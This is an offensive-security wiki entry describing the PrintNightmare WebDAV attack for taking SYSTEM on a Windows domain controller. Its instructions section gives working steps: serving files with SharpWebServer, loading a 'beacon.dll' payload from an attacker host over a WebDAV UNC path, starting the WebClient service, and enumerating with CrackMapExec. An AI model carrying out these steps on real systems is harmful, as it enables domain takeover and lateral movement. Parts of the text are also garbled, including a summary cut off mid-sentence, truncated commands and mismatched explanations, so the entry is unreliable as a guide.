---
id: 9c598deb-530f-4e00-904b-aaf24608d9ad
name: PrintNightmare WebDAV Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:02.938414+00:00'
updated_at: '2023-04-10T20:25:52.351406+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Discovery|TA0007 - Discovery]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Security Software Discovery|T1063 - Security Software Discovery]]'
- '[[Service Execution|T1035 - Service Execution]]'
- '[[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]'
- '[[Web Service|T1102 - Web Service]]'
tags:
- '[[Active Directory Attacks]]'
- '[[From CVE to SYSTEM shell on DC]]'
- '[[PrintNightmare]]'
commands:
- '[[Start SharpWebServer]]'
- '[[Start WebClient Service]]'
---

# PrintNightmare WebDAV Attack

## Summary

The PrintNightmare WebDAV attack is a technique used to exploit a vulnerability in the Windows Print Spooler service (CVE-2021-34527) to gain SYSTEM level privileges on a domain controller. The attack involves configuring a WebDAV server on an attacker-controlled machine and then tricking a victim 

## Description

# Description

The PrintNightmare WebDAV attack is a technique used to exploit a vulnerability in the Windows Print Spooler service (CVE-2021-34527) to gain SYSTEM level privileges on a domain controller. The attack involves configuring a WebDAV server on an attacker-controlled machine and then tricking a victim machine into connecting to it. With this access, the attacker can download a malicious DLL file and execute it on the victim machine, which will then execute code as SYSTEM. This can be used to escalate privileges and move laterally within the network.

From an offensive standpoint, this attack can be used to gain access to sensitive information or to take control of critical systems. From a technical perspective, this attack relies on a vulnerability in the Windows Print Spooler service and the ability to configure a WebDAV server. From a business perspective, this attack highlights the importance of keeping systems up to date and having proper security measures in place to prevent unauthorized access.

## Requirements

1. Access to a vulnerable Windows Print Spooler service

1. Ability to configure a WebDAV server

1. Trick a victim machine into connecting to the attacker-controlled WebDAV server

## Defense

1. Apply the latest security patches and updates to all systems

1. Disable the Windows Print Spooler service if it is not needed

1. Monitor network traffic for suspicious activity

## Objectives

1. Gain SYSTEM level privileges on a domain controller

1. Escalate privileges and move laterally within the network

# Instructions

1. To use SharpWebServer, run the executable file followed by the required arguments.

**Code**: [[SharpWebServer.exe port=8888 dir=c:\users\public v]]

> The 'port' argument specifies the port number that the server will listen on. The 'dir' argument specifies the directory that the server will serve files from. The 'verbose' argument specifies whether the server should output verbose logging information.

**Command** ([[Start SharpWebServer]]):

```bash
SharpWebServer.exe port=8888 dir=c:\users\public verbose=true
```

2. To configure the WebDav port, please follow these steps:
1. Open the WebDav configuration file on your server.
2. Locate the 'Port' field and replace the default value with the desired port number.
3. Save the changes and restart the WebDav service.

**Code**: [[@[PORT]]]

> This command is used to configure the port number for WebDav, which is an alternative to SMB for file sharing. The argument @[PORT] should be replaced with the desired port number. It is important to note that this command should only be used when WebDav is being used instead of SMB.

3. To download the Beacon DLL from a remote server, use the following command:

**Code**: [[\\172.16.1.5@8888\Downloads\beacon.dll]]

> The argument 'data' contains the file path to the Beacon DLL on the remote server. The URI hostname should be replaced with the actual hostname of the remote server. The file can then be downloaded and saved locally for further use.

4. To start WebClient service, run the following command:

**Code**: [[net start webclient]]

> This command will start the WebClient service on the target machine, which is required for certain types of attacks or exploits. The WebClient service allows applications to access resources on the internet, such as file shares or web pages, using the HTTP or HTTPS protocols. Without this service running, some attacks may not be possible or may fail to execute properly.

**Command** ([[Start WebClient Service]]):

```bash
net start webclient
```

5. This command is used to enumerate WebDAV shares on a target machine.

-u: Specifies the username to authenticate with.
-p: Specifies the password to authenticate with.
-d: Specifies the domain to authenticate with.
-M: Specifies the module to use, in this case 'webdav'.
[TARGET]: Specifies the target machine to enumerate WebDAV shares on.

**Code**: [[cme smb -u user -p password -d domain.local -M web]]

> The 'cme smb' command is part of the CrackMapExec (CME) tool, which is used for penetration testing and security assessments. The 'webdav' module is used to enumerate WebDAV shares on a target machine, which can be useful for identifying potential attack vectors. The '-u', '-p', and '-d' options are used to specify the credentials to authenticate with, and the '[TARGET]' argument is used to specify the target machine to enumerate shares on. This command can be used to gather information about a target network and identify potential vulnerabilities.

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Discovery|TA0007 - Discovery]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Security Software Discovery|T1063 - Security Software Discovery]]
- [[Service Execution|T1035 - Service Execution]]
- [[Signed Binary Proxy Execution|T1218 - Signed Binary Proxy Execution]]
- [[Web Service|T1102 - Web Service]]

## Commands Used

- [[Start SharpWebServer]]
- [[Start WebClient Service]]

## Tags

- [[Active Directory Attacks]]
- [[From CVE to SYSTEM shell on DC]]
- [[PrintNightmare]]
